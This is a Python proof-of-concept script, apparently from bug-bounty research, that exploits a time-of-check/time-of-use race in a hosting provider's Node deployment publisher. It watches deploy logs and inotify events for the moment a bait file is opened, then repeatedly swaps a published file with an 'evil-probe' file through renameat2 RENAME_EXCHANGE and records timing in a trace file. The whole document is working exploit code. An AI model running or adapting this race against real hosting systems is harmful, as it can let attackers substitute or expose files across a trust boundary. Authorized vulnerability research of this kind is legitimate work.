#!/usr/bin/env python3
"""Race one file after the publisher opens a large benign bait file."""

from __future__ import annotations

import ctypes
import json
import os
from pathlib import Path
import struct
import time


SYS_RENAMEAT2 = 316
AT_FDCWD = -100
RENAME_EXCHANGE = 2
IN_OPEN = 0x00000020
MARKER = b"HOSTINGER_NODE_SINGLE_FILE_TOCTOU_GATE:r231"
PUBLISHING = b"==> Publishing"
libc = ctypes.CDLL(None, use_errno=True)
first = os.fsencode("dist/probe-001")
second = os.fsencode("evil-probe")
started = time.monotonic()
deadline = started + 30.0
logs_root = Path.cwd().parents[1] / "logs"
trace = {"marker": MARKER.decode(), "event": "not-observed", "logsRootAccessible": logs_root.is_dir()}


def current_log() -> Path | None:
    try:
        candidates = sorted(logs_root.glob("*/*_deploy.log"), key=lambda item: item.stat().st_mtime_ns, reverse=True)[:8]
    except OSError:
        return None
    for candidate in candidates:
        try:
            if MARKER in candidate.read_bytes():
                return candidate
        except OSError:
            continue
    return None


def exchange() -> int:
    return libc.syscall(SYS_RENAMEAT2, AT_FDCWD, ctypes.c_char_p(first), AT_FDCWD, ctypes.c_char_p(second), RENAME_EXCHANGE)


inotify_fd = libc.inotify_init1(os.O_NONBLOCK | os.O_CLOEXEC)
watch = -1
if inotify_fd >= 0:
    watch = libc.inotify_add_watch(inotify_fd, ctypes.c_char_p(os.fsencode("dist")), IN_OPEN)
trace.update(inotifyFdOk=inotify_fd >= 0, watchOk=watch >= 0)

log_path = None
while time.monotonic() < deadline and log_path is None:
    log_path = current_log()
    if log_path is None:
        time.sleep(0.0005)

if log_path is not None and watch >= 0:
    trace.update(event="current-log-found", logFoundAfterMs=round((time.monotonic() - started) * 1000, 3))
    while time.monotonic() < deadline:
        try:
            tail = log_path.read_bytes()[-4096:]
        except OSError:
            time.sleep(0.00025)
            continue
        if PUBLISHING not in tail:
            time.sleep(0.00025)
            continue
        trace.update(event="publishing-observed", publishingAfterMs=round((time.monotonic() - started) * 1000, 3))
        event_deadline = time.monotonic() + 2.0
        bait_open = False
        while time.monotonic() < event_deadline and not bait_open:
            try:
                data = os.read(inotify_fd, 4096)
            except BlockingIOError:
                time.sleep(0.00005)
                continue
            except OSError:
                data = b""
            offset = 0
            while offset + 16 <= len(data):
                _, mask, _, name_length = struct.unpack_from("iIII", data, offset)
                name_start = offset + 16
                name_end = name_start + name_length
                name = data[name_start:name_end].split(b"\0", 1)[0]
                if mask & IN_OPEN and name == b"bait-000.bin":
                    bait_open = True
                    break
                offset = name_end
        if bait_open:
            trace.update(event="bait-open-observed", baitOpenAfterMs=round((time.monotonic() - started) * 1000, 3))
            race_deadline = time.monotonic() + 0.5
            cycles = 0
            errors = 0
            while time.monotonic() < race_deadline:
                time.sleep(0.0005)
                if exchange() != 0:
                    errors += 1
                    break
                time.sleep(0.00005)
                if exchange() != 0:
                    errors += 1
                    break
                cycles += 1
            trace.update(cycles=cycles, exchangeErrors=errors)
        break

try:
    if Path("dist/probe-001").is_symlink() and Path("evil-probe").is_file():
        exchange()
except OSError:
    pass
if inotify_fd >= 0:
    os.close(inotify_fd)
trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
try:
    trace_path = Path.home() / ".h1-r231-race-trace.json"
    trace_path.write_text(json.dumps(trace, sort_keys=True))
    trace_path.chmod(0o600)
except OSError:
    pass
